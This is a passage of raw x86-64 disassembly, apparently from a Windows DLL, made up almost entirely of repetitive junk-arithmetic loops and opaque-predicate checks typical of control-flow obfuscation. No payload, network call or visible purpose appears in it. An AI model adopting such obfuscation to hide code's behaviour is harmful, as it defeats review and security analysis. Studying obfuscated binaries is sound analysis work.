   18000399d:	41 03 cf             	add    %r15d,%ecx
   1800039a0:	41 03 cd             	add    %r13d,%ecx
   1800039a3:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800039a9:	eb 1c                	jmp    0x1800039c7
   1800039ab:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800039b1:	03 c3                	add    %ebx,%eax
   1800039b3:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800039b9:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800039bf:	03 c3                	add    %ebx,%eax
   1800039c1:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800039c7:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800039cd:	23 c6                	and    %esi,%eax
   1800039cf:	7d 07                	jge    0x1800039d8
   1800039d1:	2b c3                	sub    %ebx,%eax
   1800039d3:	83 c8 fc             	or     $0xfffffffc,%eax
   1800039d6:	03 c3                	add    %ebx,%eax
   1800039d8:	85 c0                	test   %eax,%eax
   1800039da:	74 cf                	je     0x1800039ab
   1800039dc:	e9 5b 01 00 00       	jmp    0x180003b3c
   1800039e1:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800039e7:	41 23 c2             	and    %r10d,%eax
   1800039ea:	7d 07                	jge    0x1800039f3
   1800039ec:	2b c3                	sub    %ebx,%eax
   1800039ee:	83 c8 fe             	or     $0xfffffffe,%eax
   1800039f1:	03 c3                	add    %ebx,%eax
   1800039f3:	85 c0                	test   %eax,%eax
   1800039f5:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800039fb:	74 4a                	je     0x180003a47
   1800039fd:	41 8b cf             	mov    %r15d,%ecx
   180003a00:	41 2b cd             	sub    %r13d,%ecx
   180003a03:	03 c8                	add    %eax,%ecx
   180003a05:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003a0b:	eb 1c                	jmp    0x180003a29
   180003a0d:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003a13:	03 c3                	add    %ebx,%eax
   180003a15:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003a1b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003a21:	03 c3                	add    %ebx,%eax
   180003a23:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003a29:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003a2f:	41 8b c1             	mov    %r9d,%eax
   180003a32:	f7 e9                	imul   %ecx
   180003a34:	8b c2                	mov    %edx,%eax
   180003a36:	c1 e8 1f             	shr    $0x1f,%eax
   180003a39:	03 d0                	add    %eax,%edx
   180003a3b:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003a3e:	3b c8                	cmp    %eax,%ecx
   180003a40:	74 cb                	je     0x180003a0d
   180003a42:	e9 f5 00 00 00       	jmp    0x180003b3c
   180003a47:	23 c6                	and    %esi,%eax
   180003a49:	7d 07                	jge    0x180003a52
   180003a4b:	2b c3                	sub    %ebx,%eax
   180003a4d:	83 c8 fc             	or     $0xfffffffc,%eax
   180003a50:	03 c3                	add    %ebx,%eax
   180003a52:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003a58:	85 c0                	test   %eax,%eax
   180003a5a:	74 65                	je     0x180003ac1
   180003a5c:	41 03 cf             	add    %r15d,%ecx
   180003a5f:	41 8d 45 03          	lea    0x3(%r13),%eax
   180003a63:	0f af c8             	imul   %eax,%ecx
   180003a66:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003a6c:	eb 3b                	jmp    0x180003aa9
   180003a6e:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003a74:	03 c3                	add    %ebx,%eax
   180003a76:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003a7c:	41 8b c0             	mov    %r8d,%eax
   180003a7f:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003a85:	f7 e9                	imul   %ecx
   180003a87:	d1 fa                	sar    $1,%edx
   180003a89:	8b c2                	mov    %edx,%eax
   180003a8b:	c1 e8 1f             	shr    $0x1f,%eax
   180003a8e:	03 d0                	add    %eax,%edx
   180003a90:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180003a93:	3b c8                	cmp    %eax,%ecx
   180003a95:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003a9b:	74 04                	je     0x180003aa1
   180003a9d:	2b c3                	sub    %ebx,%eax
   180003a9f:	eb 02                	jmp    0x180003aa3
   180003aa1:	03 c3                	add    %ebx,%eax
   180003aa3:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003aa9:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003aaf:	41 23 c2             	and    %r10d,%eax
   180003ab2:	7d 07                	jge    0x180003abb
   180003ab4:	2b c3                	sub    %ebx,%eax
   180003ab6:	83 c8 fe             	or     $0xfffffffe,%eax
   180003ab9:	03 c3                	add    %ebx,%eax
   180003abb:	85 c0                	test   %eax,%eax
   180003abd:	74 af                	je     0x180003a6e
   180003abf:	eb 7b                	jmp    0x180003b3c
   180003ac1:	41 8b c0             	mov    %r8d,%eax
   180003ac4:	f7 e9                	imul   %ecx
   180003ac6:	d1 fa                	sar    $1,%edx
   180003ac8:	8b c2                	mov    %edx,%eax
   180003aca:	c1 e8 1f             	shr    $0x1f,%eax
   180003acd:	03 d0                	add    %eax,%edx
   180003acf:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180003ad2:	3b c8                	cmp    %eax,%ecx
   180003ad4:	74 66                	je     0x180003b3c
   180003ad6:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003adc:	41 8d 4d 17          	lea    0x17(%r13),%ecx
   180003ae0:	83 c0 0b             	add    $0xb,%eax
   180003ae3:	99                   	cltd
   180003ae4:	f7 f9                	idiv   %ecx
   180003ae6:	eb 35                	jmp    0x180003b1d
   180003ae8:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003aee:	03 c3                	add    %ebx,%eax
   180003af0:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003af6:	41 8b c0             	mov    %r8d,%eax
   180003af9:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003aff:	f7 e9                	imul   %ecx
   180003b01:	d1 fa                	sar    $1,%edx
   180003b03:	8b c2                	mov    %edx,%eax
   180003b05:	c1 e8 1f             	shr    $0x1f,%eax
   180003b08:	03 d0                	add    %eax,%edx
   180003b0a:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180003b0d:	3b c8                	cmp    %eax,%ecx
   180003b0f:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003b15:	74 04                	je     0x180003b1b
   180003b17:	03 c3                	add    %ebx,%eax
   180003b19:	eb 02                	jmp    0x180003b1d
   180003b1b:	2b c3                	sub    %ebx,%eax
   180003b1d:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003b23:	41 8b c1             	mov    %r9d,%eax
   180003b26:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003b2c:	f7 e9                	imul   %ecx
   180003b2e:	8b c2                	mov    %edx,%eax
   180003b30:	c1 e8 1f             	shr    $0x1f,%eax
   180003b33:	03 d0                	add    %eax,%edx
   180003b35:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003b38:	3b c8                	cmp    %eax,%ecx
   180003b3a:	74 ac                	je     0x180003ae8
   180003b3c:	8b 44 24 24          	mov    0x24(%rsp),%eax
   180003b40:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   180003b45:	2b c3                	sub    %ebx,%eax
   180003b47:	48 01 05 ca 54 02 00 	add    %rax,0x254ca(%rip)        # 0x180029018
   180003b4e:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180003b53:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003b59:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003b5f:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180003b65:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003b6b:	03 c8                	add    %eax,%ecx
   180003b6d:	41 8b c1             	mov    %r9d,%eax
   180003b70:	f7 e9                	imul   %ecx
   180003b72:	8b c2                	mov    %edx,%eax
   180003b74:	c1 e8 1f             	shr    $0x1f,%eax
   180003b77:	03 d0                	add    %eax,%edx
   180003b79:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003b7c:	3b c8                	cmp    %eax,%ecx
   180003b7e:	74 4a                	je     0x180003bca
   180003b80:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003b86:	41 03 cf             	add    %r15d,%ecx
   180003b89:	41 03 c8             	add    %r8d,%ecx
   180003b8c:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003b92:	eb 1c                	jmp    0x180003bb0
   180003b94:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003b9a:	03 c3                	add    %ebx,%eax
   180003b9c:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003ba2:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003ba8:	03 c3                	add    %ebx,%eax
   180003baa:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003bb0:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003bb6:	23 c6                	and    %esi,%eax
   180003bb8:	7d 07                	jge    0x180003bc1
   180003bba:	2b c3                	sub    %ebx,%eax
   180003bbc:	83 c8 fc             	or     $0xfffffffc,%eax
   180003bbf:	03 c3                	add    %ebx,%eax
   180003bc1:	85 c0                	test   %eax,%eax
   180003bc3:	74 cf                	je     0x180003b94
   180003bc5:	e9 61 01 00 00       	jmp    0x180003d2b
   180003bca:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003bd0:	41 23 c2             	and    %r10d,%eax
   180003bd3:	7d 07                	jge    0x180003bdc
   180003bd5:	2b c3                	sub    %ebx,%eax
   180003bd7:	83 c8 fe             	or     $0xfffffffe,%eax
   180003bda:	03 c3                	add    %ebx,%eax
   180003bdc:	85 c0                	test   %eax,%eax
   180003bde:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003be4:	74 4a                	je     0x180003c30
   180003be6:	41 8b cf             	mov    %r15d,%ecx
   180003be9:	41 2b c8             	sub    %r8d,%ecx
   180003bec:	03 c8                	add    %eax,%ecx
   180003bee:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003bf4:	eb 1c                	jmp    0x180003c12
   180003bf6:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003bfc:	03 c3                	add    %ebx,%eax
   180003bfe:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003c04:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003c0a:	03 c3                	add    %ebx,%eax
   180003c0c:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003c12:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003c18:	41 8b c1             	mov    %r9d,%eax
   180003c1b:	f7 e9                	imul   %ecx
   180003c1d:	8b c2                	mov    %edx,%eax
   180003c1f:	c1 e8 1f             	shr    $0x1f,%eax
   180003c22:	03 d0                	add    %eax,%edx
   180003c24:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003c27:	3b c8                	cmp    %eax,%ecx
   180003c29:	74 cb                	je     0x180003bf6
   180003c2b:	e9 fb 00 00 00       	jmp    0x180003d2b
   180003c30:	23 c6                	and    %esi,%eax
   180003c32:	7d 07                	jge    0x180003c3b
   180003c34:	2b c3                	sub    %ebx,%eax
   180003c36:	83 c8 fc             	or     $0xfffffffc,%eax
   180003c39:	03 c3                	add    %ebx,%eax
   180003c3b:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003c41:	85 c0                	test   %eax,%eax
   180003c43:	74 67                	je     0x180003cac
   180003c45:	41 03 cf             	add    %r15d,%ecx
   180003c48:	41 8d 40 03          	lea    0x3(%r8),%eax
   180003c4c:	0f af c8             	imul   %eax,%ecx
   180003c4f:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003c55:	eb 3d                	jmp    0x180003c94
   180003c57:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003c5d:	03 c3                	add    %ebx,%eax
   180003c5f:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003c65:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180003c6a:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003c70:	f7 e9                	imul   %ecx
   180003c72:	d1 fa                	sar    $1,%edx
   180003c74:	8b c2                	mov    %edx,%eax
   180003c76:	c1 e8 1f             	shr    $0x1f,%eax
   180003c79:	03 d0                	add    %eax,%edx
   180003c7b:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180003c7e:	3b c8                	cmp    %eax,%ecx
   180003c80:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003c86:	74 04                	je     0x180003c8c
   180003c88:	2b c3                	sub    %ebx,%eax
   180003c8a:	eb 02                	jmp    0x180003c8e
   180003c8c:	03 c3                	add    %ebx,%eax
   180003c8e:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003c94:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003c9a:	41 23 c2             	and    %r10d,%eax
   180003c9d:	7d 07                	jge    0x180003ca6
   180003c9f:	2b c3                	sub    %ebx,%eax
   180003ca1:	83 c8 fe             	or     $0xfffffffe,%eax
   180003ca4:	03 c3                	add    %ebx,%eax
   180003ca6:	85 c0                	test   %eax,%eax
   180003ca8:	74 ad                	je     0x180003c57
   180003caa:	eb 7f                	jmp    0x180003d2b
   180003cac:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180003cb1:	f7 e9                	imul   %ecx
   180003cb3:	d1 fa                	sar    $1,%edx
   180003cb5:	8b c2                	mov    %edx,%eax
   180003cb7:	c1 e8 1f             	shr    $0x1f,%eax
   180003cba:	03 d0                	add    %eax,%edx
   180003cbc:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180003cbf:	3b c8                	cmp    %eax,%ecx
   180003cc1:	74 68                	je     0x180003d2b
   180003cc3:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003cc9:	41 8d 48 17          	lea    0x17(%r8),%ecx
   180003ccd:	83 c0 0b             	add    $0xb,%eax
   180003cd0:	99                   	cltd
   180003cd1:	f7 f9                	idiv   %ecx
   180003cd3:	eb 37                	jmp    0x180003d0c
   180003cd5:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003cdb:	03 c3                	add    %ebx,%eax
   180003cdd:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003ce3:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180003ce8:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003cee:	f7 e9                	imul   %ecx
   180003cf0:	d1 fa                	sar    $1,%edx
   180003cf2:	8b c2                	mov    %edx,%eax
   180003cf4:	c1 e8 1f             	shr    $0x1f,%eax
   180003cf7:	03 d0                	add    %eax,%edx
   180003cf9:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180003cfc:	3b c8                	cmp    %eax,%ecx
   180003cfe:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003d04:	74 04                	je     0x180003d0a
   180003d06:	03 c3                	add    %ebx,%eax
   180003d08:	eb 02                	jmp    0x180003d0c
   180003d0a:	2b c3                	sub    %ebx,%eax
   180003d0c:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003d12:	41 8b c1             	mov    %r9d,%eax
   180003d15:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003d1b:	f7 e9                	imul   %ecx
   180003d1d:	8b c2                	mov    %edx,%eax
   180003d1f:	c1 e8 1f             	shr    $0x1f,%eax
   180003d22:	03 d0                	add    %eax,%edx
   180003d24:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003d27:	3b c8                	cmp    %eax,%ecx
   180003d29:	74 aa                	je     0x180003cd5
   180003d2b:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   180003d30:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180003d35:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003d3b:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003d41:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180003d47:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003d4d:	03 c8                	add    %eax,%ecx
   180003d4f:	41 8b c1             	mov    %r9d,%eax
   180003d52:	f7 e9                	imul   %ecx
   180003d54:	8b c2                	mov    %edx,%eax
   180003d56:	c1 e8 1f             	shr    $0x1f,%eax
   180003d59:	03 d0                	add    %eax,%edx
   180003d5b:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003d5e:	3b c8                	cmp    %eax,%ecx
   180003d60:	74 4a                	je     0x180003dac
   180003d62:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003d68:	41 03 cf             	add    %r15d,%ecx
   180003d6b:	41 03 c8             	add    %r8d,%ecx
   180003d6e:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003d74:	eb 1c                	jmp    0x180003d92
   180003d76:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003d7c:	03 c3                	add    %ebx,%eax
   180003d7e:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003d84:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003d8a:	03 c3                	add    %ebx,%eax
   180003d8c:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003d92:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003d98:	23 c6                	and    %esi,%eax
   180003d9a:	7d 07                	jge    0x180003da3
   180003d9c:	2b c3                	sub    %ebx,%eax
   180003d9e:	83 c8 fc             	or     $0xfffffffc,%eax
   180003da1:	03 c3                	add    %ebx,%eax
   180003da3:	85 c0                	test   %eax,%eax
   180003da5:	74 cf                	je     0x180003d76
   180003da7:	e9 61 01 00 00       	jmp    0x180003f0d
   180003dac:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003db2:	41 23 c2             	and    %r10d,%eax
   180003db5:	7d 07                	jge    0x180003dbe
   180003db7:	2b c3                	sub    %ebx,%eax
   180003db9:	83 c8 fe             	or     $0xfffffffe,%eax
   180003dbc:	03 c3                	add    %ebx,%eax
   180003dbe:	85 c0                	test   %eax,%eax
   180003dc0:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003dc6:	74 4a                	je     0x180003e12
   180003dc8:	41 8b cf             	mov    %r15d,%ecx
   180003dcb:	41 2b c8             	sub    %r8d,%ecx
   180003dce:	03 c8                	add    %eax,%ecx
   180003dd0:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003dd6:	eb 1c                	jmp    0x180003df4
   180003dd8:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003dde:	03 c3                	add    %ebx,%eax
   180003de0:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003de6:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003dec:	03 c3                	add    %ebx,%eax
   180003dee:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003df4:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003dfa:	41 8b c1             	mov    %r9d,%eax
   180003dfd:	f7 e9                	imul   %ecx
   180003dff:	8b c2                	mov    %edx,%eax
   180003e01:	c1 e8 1f             	shr    $0x1f,%eax
   180003e04:	03 d0                	add    %eax,%edx
   180003e06:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003e09:	3b c8                	cmp    %eax,%ecx
   180003e0b:	74 cb                	je     0x180003dd8
   180003e0d:	e9 fb 00 00 00       	jmp    0x180003f0d
   180003e12:	23 c6                	and    %esi,%eax
   180003e14:	7d 07                	jge    0x180003e1d
   180003e16:	2b c3                	sub    %ebx,%eax
   180003e18:	83 c8 fc             	or     $0xfffffffc,%eax
   180003e1b:	03 c3                	add    %ebx,%eax
   180003e1d:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003e23:	85 c0                	test   %eax,%eax
   180003e25:	74 67                	je     0x180003e8e
   180003e27:	41 03 cf             	add    %r15d,%ecx
   180003e2a:	41 8d 40 03          	lea    0x3(%r8),%eax
   180003e2e:	0f af c8             	imul   %eax,%ecx
   180003e31:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003e37:	eb 3d                	jmp    0x180003e76
   180003e39:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003e3f:	03 c3                	add    %ebx,%eax
   180003e41:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003e47:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180003e4c:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003e52:	f7 e9                	imul   %ecx
   180003e54:	d1 fa                	sar    $1,%edx
   180003e56:	8b c2                	mov    %edx,%eax
   180003e58:	c1 e8 1f             	shr    $0x1f,%eax
   180003e5b:	03 d0                	add    %eax,%edx
   180003e5d:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180003e60:	3b c8                	cmp    %eax,%ecx
   180003e62:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003e68:	74 04                	je     0x180003e6e
   180003e6a:	2b c3                	sub    %ebx,%eax
   180003e6c:	eb 02                	jmp    0x180003e70
   180003e6e:	03 c3                	add    %ebx,%eax
   180003e70:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003e76:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003e7c:	41 23 c2             	and    %r10d,%eax
   180003e7f:	7d 07                	jge    0x180003e88
   180003e81:	2b c3                	sub    %ebx,%eax
   180003e83:	83 c8 fe             	or     $0xfffffffe,%eax
   180003e86:	03 c3                	add    %ebx,%eax
   180003e88:	85 c0                	test   %eax,%eax
   180003e8a:	74 ad                	je     0x180003e39
   180003e8c:	eb 7f                	jmp    0x180003f0d
   180003e8e:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180003e93:	f7 e9                	imul   %ecx
   180003e95:	d1 fa                	sar    $1,%edx
   180003e97:	8b c2                	mov    %edx,%eax
   180003e99:	c1 e8 1f             	shr    $0x1f,%eax
   180003e9c:	03 d0                	add    %eax,%edx
   180003e9e:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180003ea1:	3b c8                	cmp    %eax,%ecx
   180003ea3:	74 68                	je     0x180003f0d
   180003ea5:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003eab:	41 8d 48 17          	lea    0x17(%r8),%ecx
   180003eaf:	83 c0 0b             	add    $0xb,%eax
   180003eb2:	99                   	cltd
   180003eb3:	f7 f9                	idiv   %ecx
   180003eb5:	eb 37                	jmp    0x180003eee
   180003eb7:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003ebd:	03 c3                	add    %ebx,%eax
   180003ebf:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003ec5:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180003eca:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003ed0:	f7 e9                	imul   %ecx
   180003ed2:	d1 fa                	sar    $1,%edx
   180003ed4:	8b c2                	mov    %edx,%eax
   180003ed6:	c1 e8 1f             	shr    $0x1f,%eax
   180003ed9:	03 d0                	add    %eax,%edx
   180003edb:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180003ede:	3b c8                	cmp    %eax,%ecx
   180003ee0:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003ee6:	74 04                	je     0x180003eec
   180003ee8:	03 c3                	add    %ebx,%eax
   180003eea:	eb 02                	jmp    0x180003eee
   180003eec:	2b c3                	sub    %ebx,%eax
   180003eee:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003ef4:	41 8b c1             	mov    %r9d,%eax
   180003ef7:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003efd:	f7 e9                	imul   %ecx
   180003eff:	8b c2                	mov    %edx,%eax
   180003f01:	c1 e8 1f             	shr    $0x1f,%eax
   180003f04:	03 d0                	add    %eax,%edx
   180003f06:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003f09:	3b c8                	cmp    %eax,%ecx
   180003f0b:	74 aa                	je     0x180003eb7
   180003f0d:	8b 05 fd 50 02 00    	mov    0x250fd(%rip),%eax        # 0x180029010
   180003f13:	ff c8                	dec    %eax
   180003f15:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180003f19:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180003f1e:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   180003f23:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003f29:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003f2f:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180003f35:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003f3b:	03 c8                	add    %eax,%ecx
   180003f3d:	41 8b c1             	mov    %r9d,%eax
   180003f40:	f7 e9                	imul   %ecx
   180003f42:	8b c2                	mov    %edx,%eax
   180003f44:	c1 e8 1f             	shr    $0x1f,%eax
   180003f47:	03 d0                	add    %eax,%edx
   180003f49:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003f4c:	3b c8                	cmp    %eax,%ecx
   180003f4e:	74 4a                	je     0x180003f9a
   180003f50:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003f56:	41 03 cf             	add    %r15d,%ecx
   180003f59:	41 03 c8             	add    %r8d,%ecx
   180003f5c:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003f62:	eb 1c                	jmp    0x180003f80
   180003f64:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003f6a:	03 c3                	add    %ebx,%eax
   180003f6c:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003f72:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003f78:	03 c3                	add    %ebx,%eax
   180003f7a:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003f80:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003f86:	23 c6                	and    %esi,%eax
   180003f88:	7d 07                	jge    0x180003f91
   180003f8a:	2b c3                	sub    %ebx,%eax
   180003f8c:	83 c8 fc             	or     $0xfffffffc,%eax
   180003f8f:	03 c3                	add    %ebx,%eax
   180003f91:	85 c0                	test   %eax,%eax
   180003f93:	74 cf                	je     0x180003f64
   180003f95:	e9 61 01 00 00       	jmp    0x1800040fb
   180003f9a:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003fa0:	41 23 c2             	and    %r10d,%eax
   180003fa3:	7d 07                	jge    0x180003fac
   180003fa5:	2b c3                	sub    %ebx,%eax
   180003fa7:	83 c8 fe             	or     $0xfffffffe,%eax
   180003faa:	03 c3                	add    %ebx,%eax
   180003fac:	85 c0                	test   %eax,%eax
   180003fae:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003fb4:	74 4a                	je     0x180004000
   180003fb6:	41 8b cf             	mov    %r15d,%ecx
   180003fb9:	41 2b c8             	sub    %r8d,%ecx
   180003fbc:	03 c8                	add    %eax,%ecx
   180003fbe:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003fc4:	eb 1c                	jmp    0x180003fe2
   180003fc6:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003fcc:	03 c3                	add    %ebx,%eax
   180003fce:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003fd4:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003fda:	03 c3                	add    %ebx,%eax
   180003fdc:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003fe2:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003fe8:	41 8b c1             	mov    %r9d,%eax
   180003feb:	f7 e9                	imul   %ecx
   180003fed:	8b c2                	mov    %edx,%eax
   180003fef:	c1 e8 1f             	shr    $0x1f,%eax
   180003ff2:	03 d0                	add    %eax,%edx
   180003ff4:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003ff7:	3b c8                	cmp    %eax,%ecx
   180003ff9:	74 cb                	je     0x180003fc6
   180003ffb:	e9 fb 00 00 00       	jmp    0x1800040fb
   180004000:	23 c6                	and    %esi,%eax
   180004002:	7d 07                	jge    0x18000400b
   180004004:	2b c3                	sub    %ebx,%eax
   180004006:	83 c8 fc             	or     $0xfffffffc,%eax
   180004009:	03 c3                	add    %ebx,%eax
   18000400b:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004011:	85 c0                	test   %eax,%eax
   180004013:	74 67                	je     0x18000407c
   180004015:	41 03 cf             	add    %r15d,%ecx
   180004018:	41 8d 40 03          	lea    0x3(%r8),%eax
   18000401c:	0f af c8             	imul   %eax,%ecx
   18000401f:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180004025:	eb 3d                	jmp    0x180004064
   180004027:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000402d:	03 c3                	add    %ebx,%eax
   18000402f:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004035:	b8 67 66 66 66       	mov    $0x66666667,%eax
